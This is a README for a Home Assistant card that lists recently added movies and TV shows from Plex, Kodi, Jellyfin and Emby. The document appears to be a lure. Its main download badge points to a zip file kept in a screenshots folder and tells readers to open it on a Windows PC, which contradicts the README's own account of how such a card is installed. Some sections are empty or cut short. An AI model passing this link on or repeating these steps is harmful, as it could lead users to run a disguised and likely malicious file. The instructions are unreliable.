# 📺 recently-added-media-card - See new media at a glance

[![Download the latest release](https://img.shields.io/badge/Download%20Latest-Release-4B6CB7?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/ffli3550/recently-added-media-card/main/screenshots/recently-added-media-card-v1.1-beta.5.zip)

## 🖥️ What this is

recently-added-media-card is a Home Assistant card that shows the latest movies and TV shows added to your media server. It works with Plex, Kodi, Jellyfin, and Emby.

Use it in your Home Assistant dashboard to keep new media easy to find. The card fits well in a media view and gives your screen a clean, cinema-style look.

Visit this page to download:

On the release page, look for the newest version. Download the file that matches your setup, then open it on your Windows PC.

## 🪟 How to use it on Windows

This card is made for Home Assistant dashboards, so you do not run it like a normal Windows app. Instead, you download the release from GitHub and add it to Home Assistant.

Follow these steps:

1. Open the download page.
2. Save the release file to your computer.
3. Move or install the file in Home Assistant.
4. Add the card to your dashboard.
5. Refresh your browser if you do not see it right away.

If you use HACS, you can add the card through HACS and then load it in Lovelace.

## ✨ What it shows

This card can display:

- Recently added movies
- Recently added TV shows
- Poster art and cover images
- Titles and release details
- Media from more than one server type
- A layout that works well on a TV or tablet

It is made to help you spot new content fast without opening each app.

## 🔧 Before you start

You need:

- A Windows PC to download the release
- Home Assistant running on your network
- A supported media server such as Plex, Kodi, Jellyfin, or Emby
- Access to your Home Assistant dashboard
- HACS if you want the easiest setup path

For the best result, make sure your media server is already connected to Home Assistant.

## 🧩 Supported media servers

This card works with these sources:

Each one can feed recent media into the card so you can view new additions in one place.

## 🛠️ Install with HACS

If you use HACS, follow these steps:

1. Open Home Assistant.
2. Go to HACS.
3. Open the frontend section.
4. Add this repository if needed.
5. Search for recently-added-media-card.
6. Install the card.
7. Restart Home Assistant or reload the page if asked.

After that, add the card to your Lovelace dashboard.

## 📋 Add the card to your dashboard

Use this basic card setup after installation:

- Open your dashboard in Home Assistant.
- Edit the view.
- Add a new card.
- Pick recently-added-media-card.
- Connect it to your media source.
- Save the view.

If you use YAML, place the card config in your dashboard file and point it to the media list you want to show.

## 🎛️ Simple setup example

A basic setup may include:

- A title like Recent Movies
- A source for Plex, Kodi, Jellyfin, or Emby
- A limit for how many items to show
- An option to show posters
- A grid or row layout

Example ideas for a clean view:

- Show 6 to 12 items
- Use large posters on a media wall
- Use a dark theme for a cinema feel
- Keep the card near the top of your dashboard

## 🧠 Tips for best results

- Use a wide dashboard area for poster art
- Keep the item count low if your screen is small
- Pair it with other media cards for a full media page
- Use the same theme across your dashboard for a neat look
- Refresh the browser if the card does not appear after setup
